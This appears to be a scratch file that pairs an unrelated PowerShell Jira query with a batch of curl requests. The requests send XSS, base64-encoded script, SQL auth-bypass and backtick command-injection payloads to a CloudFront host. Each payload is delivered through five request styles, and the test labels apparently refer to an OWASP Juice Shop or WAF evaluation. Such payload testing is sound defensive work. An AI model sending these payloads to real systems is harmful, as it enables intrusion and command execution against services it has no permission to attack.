$appId = "9c41a1d2-71ad-39d8-b32a-589aab03bfbc"
$jql   = 'updated >= -6w AND assignee in ("7903162")'
$path  = [uri]::EscapeDataString("/rest/api/2/search?jql=$jql&maxResults=50&fields=key,summary,status,created,priority")

$r = irm "$conf/plugins/servlet/applinks/proxy?appId=$appId&path=$path" -UseDefaultCredentials

$r.issues | Select `
    @{n='Key';e={$_.key}},
    @{n='Summary';e={$_.fields.summary}},
    @{n='Status';e={$_.fields.status.name}},
    @{n='Created';e={([datetime]$_.fields.created).ToString('yyyy-MM-dd HH:mm')}} |
  Sort Created -Descending | Format-Table -Auto
  
 USER_AGENT="dlpaasrngb6ue.cloudfront.net"
  HOST="https://dlpaasrngb6ue.cloudfront.net"

  Variant 1 — POST body (POST /rest/user/login)

  juiceshop-0014 (xss · nested-tag evasion)
  curl -sk -i -m 15 -X POST "$HOST/rest/user/login" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0014" -H "X-Test-Category: xss" -H "X-Test-Payload: %3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3" -d '{"q": "%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E"}'

  juiceshop-0036 (base64 · <script>alert(1)</script> encoded)
  curl -sk -i -m 15 -X POST "$HOST/rest/user/login" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" -d '{"q": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}'

  juiceshop-0049 (sqli · auth-bypass + comment)
  curl -sk -i -m 15 -X POST "$HOST/rest/user/login" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0049" -H "X-Test-Category: sqli" -H "X-Test-Payload: admin' #" -d '{"q": "admin'\'' #"}'

  juiceshop-0118 (cmdi · backtick command substitution)
  curl -sk -i -m 15 -X POST "$HOST/rest/user/login" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0118" -H "X-Test-Category: cmdi" -H "X-Test-Payload: ;\`id\`" -d '{"q": ";`id`"}'

  Variant 2 — GET querystring (GET /rest/products/search?q=)

  juiceshop-0031 (xss · nested-tag with partial-encoding bypass)
  curl -sk -i -m 15 "$HOST/rest/products/search?q=%22%3E%3Cimg%20src%3Dx%20o%256ener%2572%3Dalert%281%29%3E" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0031" -H "X-Test-Category: xss" -H "X-Test-Payload: \"><img src=x o%6ener%72=alert(1)>"

  juiceshop-0036 (base64)
  curl -sk -i -m 15 "$HOST/rest/products/search?q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

  juiceshop-0049 (sqli · auth-bypass)
  curl -sk -i -m 15 "$HOST/rest/products/search?q=admin%27%20%23" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0049" -H "X-Test-Category: sqli" -H "X-Test-Payload: admin' #"

  juiceshop-0118 (cmdi)
  curl -sk -i -m 15 "$HOST/rest/products/search?q=%3B%60id%60" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0118" -H "X-Test-Category: cmdi" -H "X-Test-Payload: ;\`id\`"

  Variant 3 — GET with body (GET /rest/products/search + JSON body)

  juiceshop-0014 (xss)
  curl -sk -i -m 15 --request GET "$HOST/rest/products/search" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0014" -H "X-Test-Category: xss" -H "X-Test-Payload: %3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3" -d '{"q":
  "%3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3E"}'

  juiceshop-0036 (base64)
  curl -sk -i -m 15 --request GET "$HOST/rest/products/search" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" -d '{"q": "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="}'

  juiceshop-0049 (sqli)
  curl -sk -i -m 15 --request GET "$HOST/rest/products/search" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0049" -H "X-Test-Category: sqli" -H "X-Test-Payload: admin' #" -d '{"q": "admin'\'' #"}'

  juiceshop-0118 (cmdi)
  curl -sk -i -m 15 --request GET "$HOST/rest/products/search" -H 'Content-Type: application/json' -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0118" -H "X-Test-Category: cmdi" -H "X-Test-Payload: ;\`id\`" -d '{"q": ";`id`"}'

  Variant 4 — GET with cookie (GET /rest/products/search + Cookie: q=…)

  juiceshop-0014 (xss)
  curl -sk -i -m 15 "$HOST/rest/products/search" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0014" -H "X-Test-Category: xss" -H "X-Test-Payload: %3Cscrscriptipt%3Ealert%281%29%3C%2Fscrscriptipt%3" -H "Cookie: q=%253Cscrscriptipt%253Ealert%25281%2529%253C%252Fscrscriptipt%253E"

  juiceshop-0036 (base64)
  curl -sk -i -m 15 "$HOST/rest/products/search" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==" -H "Cookie: q=PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D"

  juiceshop-0049 (sqli)
  curl -sk -i -m 15 "$HOST/rest/products/search" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0049" -H "X-Test-Category: sqli" -H "X-Test-Payload: admin' #" -H "Cookie: q=admin%27%20%23"

  juiceshop-0118 (cmdi)
  curl -sk -i -m 15 "$HOST/rest/products/search" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0118" -H "X-Test-Category: cmdi" -H "X-Test-Payload: ;\`id\`" -H "Cookie: q=%3B%60id%60"

  Variant 5 — GET with URI (payload appended to path)

  juiceshop-0002 (xss · double-URL-encoded)
  curl -sk -i -m 15 "$HOST/rest/products/search/%25253Cscript%25253Ealert%281%29%25253C%2Fscript%25253E" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0002" -H "X-Test-Category: xss" -H "X-Test-Payload: %253Cscript%253Ealert(1)%253C/script%253E"

  juiceshop-0036 (base64)
  curl -sk -i -m 15 "$HOST/rest/products/search/PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%3D%3D" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0036" -H "X-Test-Category: base64" -H "X-Test-Payload: PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="

  juiceshop-0049 (sqli)
  curl -sk -i -m 15 "$HOST/rest/products/search/admin%27%20%23" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0049" -H "X-Test-Category: sqli" -H "X-Test-Payload: admin' #"

  juiceshop-0118 (cmdi)
  curl -sk -i -m 15 "$HOST/rest/products/search/%3B%60id%60" -H "User-Agent: $USER_AGENT" -H "X-Test-Id: juiceshop-0118" -H "X-Test-Category: cmdi" -H "X-Test-Payload: ;\`id\`"
